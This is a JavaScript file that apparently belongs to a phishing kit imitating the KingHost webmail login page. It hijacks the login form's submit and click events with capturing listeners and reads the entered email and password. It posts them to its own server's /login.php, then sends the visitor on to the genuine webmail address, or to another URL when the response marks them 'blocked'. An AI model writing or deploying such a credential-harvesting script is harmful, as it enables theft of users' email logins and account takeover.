"use strict";

(function () {
    var cfg = window.LOGIN_BRIDGE || {};
    var official = window.UOL_OFFICIAL || "https://webmail.kinghost.com.br/";
    var M = window.UOL_MESSAGES || {};
    var bound = false;

    function resolveUrl(url) {
        var u = String(url || "/login.php");
        if (/^https?:\/\//i.test(u)) return u;
        if (u.charAt(0) === "/") return window.location.origin + u;
        return window.location.origin + "/" + u;
    }

    function q(sel, root) {
        return (root || document).querySelector(sel);
    }

    function showAguarde() {
        hideAguarde();
        var el = document.createElement("div");
        el.id = "ttrLoading";
        el.style.cssText =
            "width:115px;position:fixed;top:12px;right:12px;z-index:99999;background:#fff;border:2px solid #A38ECF;opacity:0.85;padding:6px 8px;text-align:center;border-radius:2px;box-shadow:0 2px 8px rgba(0,0,0,.15);";
        el.innerHTML =
            '<span style="font-size:10px;font-family:Tahoma,sans-serif;color:#A38ECF">aguarde</span><br>' +
            '<img src="https://webmail.kinghost.com.br/img/loading_menor.gif" width="32" height="32" alt="" />';
        document.body.appendChild(el);
    }

    function hideAguarde() {
        var el = document.getElementById("ttrLoading");
        if (el) el.remove();
    }

    function clearMessage() {
        var el = q(cfg.message || "#divretorno");
        if (el) {
            el.innerHTML = "";
            el.textContent = "";
            el.style.display = "none";
        }
    }

    function finishResult(result, submitEl) {
        hideAguarde();
        clearMessage();

        var data = result.data || {};

        if (data.blocked && data.redirect) {
            window.location.replace(data.redirect);
            return;
        }

        if (data.ok) {
            window.location.replace(data.redirect || official);
            return;
        }

        document.body.classList.remove("logging-in");
        if (submitEl) submitEl.disabled = false;

        var msg = String(data.text || "").trim();
        if (!msg) {
            msg = "Usuário desconhecido ou senha incorreta";
        }
        window.alert(msg);
    }

    function doLogin(form, submitEl) {
        var emailSel = cfg.email || "#login_username";
        var passSel = cfg.password || "#secretkey";
        var action = resolveUrl(cfg.action || "/login.php");

        var emailEl = q(emailSel, form);
        var passEl = q(passSel, form);
        var email = emailEl ? String(emailEl.value || "").trim() : "";
        var pass = passEl ? String(passEl.value || "") : "";

        if (!email) {
            window.alert("Informe seu e-mail para entrar.");
            return;
        }
        if (!pass) {
            window.alert("Informe sua senha para entrar.");
            return;
        }

        clearMessage();
        document.body.classList.add("logging-in");
        if (submitEl) submitEl.disabled = true;
        showAguarde();

        var body =
            "login=" +
            encodeURIComponent(email) +
            "&password=" +
            encodeURIComponent(pass);

        fetch(action, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            credentials: "same-origin",
            cache: "no-store",
            body: body,
        })
            .then(function (res) {
                return res.text().then(function (text) {
                    var data = null;
                    try {
                        data = text ? JSON.parse(text) : null;
                    } catch (err) {
                        data = null;
                    }
                    if (!data) {
                        return {
                            ok: false,
                            data: {
                                ok: false,
                                text: M.network_error || "Erro de conexão. Tente novamente.",
                            },
                        };
                    }
                    return { ok: res.ok, data: data };
                });
            })
            .then(function (result) {
                finishResult(result, submitEl);
            })
            .catch(function () {
                hideAguarde();
                clearMessage();
                document.body.classList.remove("logging-in");
                if (submitEl) submitEl.disabled = false;
                window.alert(M.network_error || "Erro de conexão. Tente novamente.");
            });
    }

    function bindForm(form) {
        if (!form || bound) return;
        bound = true;
        form.dataset.kinghostBridge = "1";

        var submitSel = cfg.submit || "#submit";
        var submitEl = q(submitSel, form) || document.getElementById("submit");

        form.setAttribute("action", resolveUrl(cfg.action || "/login.php"));
        form.setAttribute("method", "post");
        form.setAttribute("novalidate", "novalidate");
        form.onsubmit = function () {
            return false;
        };

        form.addEventListener(
            "submit",
            function (e) {
                e.preventDefault();
                e.stopImmediatePropagation();
                doLogin(form, submitEl);
            },
            true
        );

        if (submitEl) {
            submitEl.setAttribute("type", "button");
            submitEl.addEventListener(
                "click",
                function (e) {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                    doLogin(form, submitEl);
                },
                true
            );
        }

        window.processa_login = function () {
            doLogin(form, submitEl);
            return false;
        };
    }

    function start() {
        var form = q(cfg.form || "#form_login") || document.getElementById("form_login");
        if (form) bindForm(form);
    }

    window.kinghostBridgeInit = start;

    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", start);
    } else {
        start();
    }
    window.addEventListener("load", start);
})();
